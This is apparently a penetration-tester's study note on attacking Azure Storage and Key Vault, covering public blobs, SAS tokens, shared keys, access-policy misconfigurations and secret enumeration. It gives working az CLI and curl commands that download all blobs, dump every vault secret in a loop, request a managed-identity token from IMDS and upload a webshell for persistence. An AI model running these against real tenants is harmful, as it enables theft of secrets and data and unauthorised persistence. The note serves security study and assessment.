# 02.4 — Azure Storage and Key Vault Attacks

## What This Note Covers

Azure Blob Storage and Azure Key Vault are where organisations store their most sensitive data and secrets. Both are frequently misconfigured. This note covers public blob access, SAS token abuse, shared key exposure, Key Vault access policy misconfigurations, and secret enumeration.

---

## Azure Blob Storage — Overview

Azure Blob Storage is Azure's equivalent of S3. It has three components:

```
Storage Account (top-level container — has its own auth config)
└── Container (like an S3 bucket)
    └── Blobs (objects/files)
```

Access is controlled at multiple levels:
- **Storage Account level** — network rules, shared key auth, public access setting
- **Container level** — public access tier (private, blob, container)
- **RBAC** — Azure roles (Storage Blob Data Reader/Contributor/Owner)
- **SAS tokens** — time-limited, scoped access tokens

---

## Attack 1: Anonymous Blob Access

Azure containers can be set to three access tiers:

| Tier | What's Public |
|---|---|
| **Private** | No public access (requires auth) |
| **Blob** | Individual blobs are public if you know the URL, but listing is not |
| **Container** | Full anonymous listing AND downloading of blobs |

```bash
# Check if a storage account allows public access
az storage account show \
  --name TARGET_STORAGE \
  --resource-group TARGET_RG \
  --query "allowBlobPublicAccess"
# true → public access allowed at account level

# Check container access tier
az storage container show \
  --account-name TARGET_STORAGE \
  --name TARGET_CONTAINER \
  --query "properties.publicAccess"
# "container" → fully public
# "blob" → blobs public if URL known
# null or "off" → private

# List blobs in a public container (no auth)
az storage blob list \
  --account-name TARGET_STORAGE \
  --container-name TARGET_CONTAINER \
  --output table \
  --auth-mode anonymous

# Access directly via HTTP
curl https://TARGET_STORAGE.blob.core.windows.net/TARGET_CONTAINER/
# If container-level public: returns XML blob listing
curl https://TARGET_STORAGE.blob.core.windows.net/TARGET_CONTAINER/file.txt
```

### Discovery

```bash
# Subdomain enumeration identifies Azure storage accounts
# Common patterns:
# COMPANY.blob.core.windows.net
# COMPANYbackup.blob.core.windows.net
# COMPANYdev.blob.core.windows.net
# COMPANYprod.blob.core.windows.net
# COMPANYassets.blob.core.windows.net

# Tool: cloud_enum
python3 cloud_enum.py -k targetcompany --disable-aws --disable-gcp

# Tool: MicroBurst
Get-AzurePasswords  # PowerShell, searches for exposed storage accounts
Invoke-EnumerateAzureBlobs -Base targetcompany  # checks common naming patterns
```

## Attack 2: SAS Token Abuse

A **Shared Access Signature (SAS) token** is a URI parameter string that grants time-limited, scoped access to Azure Storage resources. There are three types:

| SAS Type | Scope |
|---|---|
| **Account SAS** | Entire storage account (all services, containers) |
| **Service SAS** | Single service (blob, queue, table, or file) |
| **User Delegation SAS** | Blob/container, signed with Azure AD credentials |

### Where SAS Tokens Are Found

```bash
# 1. In application code (hardcoded)
grep -r "sv=20\|sig=\|se=20" . --include="*.py" --include="*.js" --include="*.config"

# 2. In application logs (SAS tokens appear in full URLs logged by web servers)

# 3. In email links or document sharing URLs
# SharePoint/OneDrive SAS URLs look different but same principle

# 4. In CI/CD pipeline configs
# GitHub Actions secrets, Azure DevOps variable groups

# 5. In Azure Storage Explorer config files
# ~/.azuredatastudio/ or similar
```

### SAS Token Anatomy

```
https://ACCOUNT.blob.core.windows.net/CONTAINER/BLOB?
  sv=2021-08-06        ← storage version
  &ss=b               ← services (b=blob)
  &srt=co             ← resource types (c=container, o=object)
  &sp=rl              ← permissions (r=read, l=list)
  &se=2024-12-31T00%3A00%3AZ  ← expiry time
  &st=2024-01-01T00%3A00%3AZ  ← start time
  &spr=https          ← protocols
  &sig=BASE64SIGNATURE ← HMAC signature
```

### Exploiting a Found SAS Token

```bash
# Decode the SAS token permissions
# sp=racwdl → r=read, a=add, c=create, w=write, d=delete, l=list

# Use SAS token to list blobs
az storage blob list \
  --account-name ACCOUNT \
  --container-name CONTAINER \
  --sas-token "sv=2021...&sig=..." \
  --output table

# Download a blob with SAS token
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER/secret.txt?sv=2021...&sig=..."

# Upload a blob (if SAS has write permission — useful for persistence)
az storage blob upload \
  --account-name ACCOUNT \
  --container-name CONTAINER \
  --name webshell.aspx \
  --file webshell.aspx \
  --sas-token "sv=2021...&sig=..."
```

> [!warning] Account-level SAS tokens are critical
> If a SAS token covers the entire account (srt=sco) with read+list permissions, it exposes all data in all containers. Account-level SAS tokens with write/delete are catastrophic.

## Attack 3: Storage Account Shared Key

Every Azure Storage account has two **account keys** — 512-bit symmetric keys that grant full access to everything in the account. They're used for legacy authentication.

```bash
# List storage accounts in a subscription
az storage account list --output table

# Get storage account keys (requires Microsoft.Storage/storageAccounts/listKeys/action)
az storage account keys list \
  --account-name TARGET_STORAGE \
  --resource-group TARGET_RG

# Returns two keys — either grants full access to the entire storage account

# Use the key to access storage
az storage blob list \
  --account-name TARGET_STORAGE \
  --container-name TARGET_CONTAINER \
  --account-key "BASE64_KEY" \
  --output table

# Download all blobs
az storage blob download-batch \
  --destination ./local-output \
  --source TARGET_CONTAINER \
  --account-name TARGET_STORAGE \
  --account-key "BASE64_KEY"
```

> [!danger] Storage account keys = God-mode for storage
> Shared keys bypass RBAC, bypass network rules, and have no IP restriction by default. Anyone with the key has full read/write/delete access to all data in the account. Treat them like root credentials.

## Azure Key Vault — Overview

Azure Key Vault stores:
- **Secrets** — arbitrary key-value pairs (database passwords, API keys, connection strings)
- **Keys** — cryptographic keys (used for encryption operations, including Azure Disk Encryption)
- **Certificates** — TLS/SSL certificates with their private keys

Access is controlled by **two separate mechanisms**:
1. **Access Policies** (legacy) — Key Vault's own ACL system, separate from Azure RBAC
2. **Azure RBAC** (newer, recommended) — standard Azure role assignments

Both mechanisms can be misconfigured.

---

## Attack 4: Key Vault Access Policy Misconfigurations

### Enumerate Key Vault Access Policies

```bash
# List all Key Vaults in the subscription
az keyvault list --output table

# Get access policies for a vault
az keyvault show \
  --name TARGET_VAULT \
  --query "properties.accessPolicies"

# Returns list of principals and their permissions:
{
  "objectId": "USER_OR_SP_OBJECT_ID",
  "permissions": {
    "secrets": ["get", "list", "set", "delete"],
    "keys": ["get", "list"],
    "certificates": ["get", "list"]
  }
}
```

### Common Misconfigurations

**1. Wildcard permissions granted to broad groups:**
```bash
# If "All Users" or a large group has "list" and "get" on secrets
# Every user in the tenant can read every secret
```

**2. Service principals with excessive Key Vault permissions:**
```bash
# CI/CD service principal with "set" permission can write secrets
# Attacker with SP access can overwrite secrets used by production apps
```

**3. Key Vault accessible from public internet without firewall:**
```bash
# Check network rules
az keyvault show \
  --name TARGET_VAULT \
  --query "properties.networkAcls"
# If "defaultAction": "Allow" → accessible from any IP
```

### Enumerating and Stealing Secrets

```bash
# List all secrets in a vault (requires "list" permission)
az keyvault secret list \
  --vault-name TARGET_VAULT \
  --output table

# Get the value of a specific secret (requires "get" permission)
az keyvault secret show \
  --vault-name TARGET_VAULT \
  --name db-password

# Get ALL secrets — list then get each
az keyvault secret list \
  --vault-name TARGET_VAULT \
  --query "[].name" \
  --output tsv | while read secret; do
    echo "=== $secret ==="
    az keyvault secret show \
      --vault-name TARGET_VAULT \
      --name "$secret" \
      --query "value" --output tsv
  done

# List keys
az keyvault key list --vault-name TARGET_VAULT

# List certificates (also contains private key material)
az keyvault certificate list --vault-name TARGET_VAULT
az keyvault certificate show --vault-name TARGET_VAULT --name CERT_NAME
```

## Attack 5: Key Vault RBAC Misconfigurations

When a Key Vault is configured for Azure RBAC (not access policies), standard RBAC roles apply:

| Role | What It Allows |
|---|---|
| Key Vault Administrator | Full access to all secrets, keys, certs |
| Key Vault Secrets Officer | Create/read/update/delete secrets |
| Key Vault Secrets User | Read secret values |
| Key Vault Reader | Read metadata only (not values) |

```bash
# Check RBAC model
az keyvault show \
  --name TARGET_VAULT \
  --query "properties.enableRbacAuthorization"
# true → using RBAC
# false → using access policies

# Check who has Key Vault roles
az role assignment list \
  --scope /subscriptions/SUB_ID/resourceGroups/RG/providers/Microsoft.KeyVault/vaults/VAULT_NAME \
  --output table
```

> [!tip] Using managed identity token to access Key Vault
> If you've stolen a managed identity token (via IMDS) and the managed identity has Key Vault permissions, request a vault-scoped token and enumerate secrets:
> ```bash
> # Get Key Vault token from IMDS
> curl -H "Metadata: true" \
>   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
> 
> # List secrets
> curl -H "Authorization: Bearer VAULT_TOKEN" \
>   "https://TARGET_VAULT.vault.azure.net/secrets?api-version=7.4"
> ```
